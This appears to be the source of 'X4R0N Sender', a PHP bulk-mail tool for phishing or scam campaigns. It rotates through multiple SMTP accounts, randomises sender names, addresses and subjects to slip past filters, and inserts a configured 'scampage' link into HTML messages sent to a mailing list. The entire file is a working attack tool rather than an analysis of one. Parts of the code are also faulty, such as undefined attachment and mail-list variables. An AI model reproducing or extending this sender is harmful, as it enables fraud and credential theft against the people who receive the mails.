<?php

/*
X4R0N Sender By ARON-TN
FB: WWW.FACEBOOK.COM/AMIR.OTHMAN.OFFICIAL
KILLER MAIL !
=======================================================================
  :::.    :::::::..       ...   :::.    :::. :::::::::::::::.    :::.
  ;;`;;   ;;;;``;;;;   .;;;;;;;.`;;;;,  `;;; ;;;;;;;;''''`;;;;,  `;;;
 ,[[ '[[,  [[[,/[[['  ,[[     \[[,[[[[[. '[[      [[       [[[[[. '[[
c$$$cc$$$c $$$$$$c    $$$,     $$$$$$ "Y$c$$ cccc $$       $$$ "Y$c$$
 888   888,888b "88bo,"888,_ _,88P888    Y88      88,      888    Y88
 YMM   ""` MMMM   "W"   "YMMMMMP" MMM     YM      MMM      MMM     YM
=======================================================================

*/

require_once("setting/phpmailer/PHPMailerAutoload.php");
include('setting/Gx.settings.php');
include('setting/Gx.function.php');

echo "Sender phpmyadmin\r\n";
echo "\n\n          XXXXXXX       XXXXXXX    444444444  RRRRRRRRRRRRRRRRR        000000000     NNNNNNNN        NNNNNNNN\r\n";
echo "              X:::::X       X:::::X   4::::::::4  R::::::::::::::::R     00:::::::::00   N:::::::N       N::::::N\r\n";
echo "              X:::::X       X:::::X  4:::::::::4  R::::::RRRRRR:::::R  00:::::::::::::00 N::::::::N      N::::::N\r\n";
echo "              X::::::X     X::::::X 4::::44::::4  RR:::::R     R:::::R0:::::::000:::::::0N:::::::::N     N::::::N\r\n";
echo "              XXX:::::X   X:::::XXX4::::4 4::::4    R::::R     R:::::R0::::::0   0::::::0N::::::::::N    N::::::N\r\n";
echo "                 X:::::X X:::::X  4::::4  4::::4    R::::R     R:::::R0:::::0     0:::::0N:::::::::::N   N::::::N\r\n";
echo "                  X:::::X:::::X  4::::4   4::::4    R::::RRRRRR:::::R 0:::::0     0:::::0N:::::::N::::N  N::::::N\r\n";
echo "                   X:::::::::X  4::::444444::::444  R:::::::::::::RR  0:::::0 000 0:::::0N::::::N N::::N N::::::N\r\n";
echo "                   ===========  ==================  ================   ========================== ====== =======\e[0m\r\n";
echo "                   \e[107m                                                                                              \r\n";
echo "\e[0m                               X4R0N V1 - ARON-TN FAcebook : www.facebook.com/amir.othman.official\r\n";
echo "                   \e[107m                                                                                              \r\n";
echo "                   ===========  ==================  ================   ========================== ====== =======\e[0m\r\n";
echo "                   X:::::::::X  4::::::::::::::::4  R::::RRRRRR:::::R 0:::::0 000 0:::::0N::::::N  N::::N:::::::N\r\n";
echo "                  X:::::X:::::X 4444444444:::::444  R::::R     R:::::R0:::::0     0:::::0N::::::N   N:::::::::::N\r\n";
echo "                 X:::::X X:::::X          4::::4    R::::R     R:::::R0:::::0     0:::::0N::::::N    N::::::::::N\r\n";
echo "              XXX:::::X   X:::::XXX       4::::4    R::::R     R:::::R0::::::0   0::::::0N::::::N     N:::::::::N\r\n";
echo "              X::::::X     X::::::X       4::::4  RR:::::R     R:::::R0:::::::000:::::::0N::::::N      N::::::::N\r\n";
echo "              X:::::X       X:::::X     44::::::44R::::::R     R:::::R 00:::::::::::::00 N::::::N       N:::::::N\r\n";
echo "              X:::::X       X:::::X     4::::::::4R::::::R     R:::::R   00:::::::::00   N::::::N        N::::::N\r\n";
echo "              XXXXXXX       XXXXXXX     4444444444RRRRRRRR     RRRRRRR     000000000     NNNNNNNN         NNNNNNN\r\n";
echo "\r\n";


function Kirim($email, $smtp_acc, $gx_setup)
{
    $smtp           = new SMTP;
    $smtp->do_debug = 0;

    $smtpserver     = $smtp_acc['host'];
    $smtpport       = $smtp_acc['port'];
    $smtpuser       = $smtp_acc['username'];
    $smtppass       = $smtp_acc['password'];
    $priority       = $gx_setup['priority'];
    $userandom      = $gx_setup['userandom'];
    $sleeptime      = $gx_setup['sleeptime'];
    $replacement    = $gx_setup['replacement'];
    $userremoveline = $gx_setup['userremoveline'];
    $fromname       = $gx_setup['fromname'];
    $frommail       = $gx_setup['frommail'];
    $subject        = $gx_setup['subject'];
    $msgfile        = $gx_setup['msgfile'];
    $filepdf        = $gx_setup['filesend'];
    $randurl        = $gx_setup['scampage'];

    if (!$smtp->connect($smtpserver, $smtpport)) {
        throw new Exception('Connect failed');
    }

    //Say hello
    if (!$smtp->hello(gethostname())) {
        throw new Exception('EHLO failed: ' . $smtp->getError()['error']);
    }

    $e = $smtp->getServerExtList();

    if (array_key_exists('STARTTLS', $e)) {
        $tlsok = $smtp->startTLS();
        if (!$tlsok) {
            throw new Exception('Failed to start encryption: ' . $smtp->getError()['error']);
        }
        if (!$smtp->hello(gethostname())) {
            throw new Exception('EHLO (2) failed: ' . $smtp->getError()['error']);
        }
        $e = $smtp->getServerExtList();
    }

    if (array_key_exists('AUTH', $e)) {

        if ($smtp->authenticate($smtpuser, $smtppass)) {
            $mail           = new PHPMailer;
            $mail->Encoding = 'base64'; // 8bit base64 multipart/alternative quoted-printable
            $mail->CharSet  = 'UTF-8';
            $mail->headerLine("format", "flowed");
            /*  Smtp connect    */
            //$mail->addCustomHeader('X-Ebay-Mailtracker', '11400.000.0.0.df812eaca5dd4ebb8aa71380465a8e74');
            $mail->IsSMTP();
            $mail->SMTPAuth = true;
            $mail->Host     = $smtpserver;
            $mail->Port     = $smtpport;
            $mail->Priority = $priority;
            $mail->Username = $smtpuser;
            $mail->Password = $smtppass;

            if ($userandom == 1) {
                $rand     = rand(1, 50);
                $fromname = randName($rand);
                $frommail = randMail($rand);
                $subject  = randSubject($rand);
            }

            if ($gx_setup['filesend'] == 0) {
                $filepdf = file_get_contents($AddAttachment);
                $mail->AddAttachment($filepdf);
            }

            $asu       = RandString1(8);
            $asu1      = RandString(5);
            $asu2      = RandString1(5);
            $nmbr      = RandNumber(5);
            $fromnames = str_replace('##randstring##', $asu1, $fromname);
            $frommails = str_replace('##randstring##', $asu, $frommail);
            $subjects  = str_replace('##randstring##', $asu2, $subject);

            $mail->setFrom($frommails, $fromnames);

            $mail->AddAddress($email);

            $mail->Subject = $subjects;
            if ($replacement == 1) {
                $msg = lettering($msgfile, $email, $frommail, $fromname, $randurl, $subject);
            } else {
                $msg = file_get_contents($msgfile);
            }

            $mail->msgHTML($msg);

            if (!$mail->send()) {
                echo "SMTP Error : " . $mail->ErrorInfo;
                exit();
            } else {
                echo "\e[91m[+] \e[4m";
                echo date('h:i:s A');
                echo "\e[0m \e[91m[+] \e[0m Send To : $email \e[91m|\e[0m Send From : $smtpuser\n";
            }
            $mail->clearAddresses();

        } else {
            throw new Exception('Authentication failed: ' . $smtp->getError()['error']);
        }

        $smtp->quit(true);

    }

}



    $file = file_get_contents($gx_setup['mail_list']);
    if ($file) {
        $ext = preg_split('/\n|\r\n?/', $file);
        echo "                               \e[1;4m_________________\e[0m \r\n";
        echo "\e[91m=============================[\e[0m \e[1;4mX4R0N SENDER READY\e[0m \e[91m]==============================\e[0m";
        echo "\r\n";
        echo "\n";
        $smtp_key = 0;
        foreach ($ext as $num => $email) {

            if ($smtp_key == count($smtp_acc)) {
                $smtp_key = 0;
            }
            //kirim
            Kirim($email, $smtp_acc[$smtp_key], $gx_setup);

            $smtp_key++;

            ///
            sleep($gx_setup['sleeptime']);
        }
        if ($gx_setup['userremoveline'] == 1) {
            $remove = Removeline($mailist, $email);
        }
    }
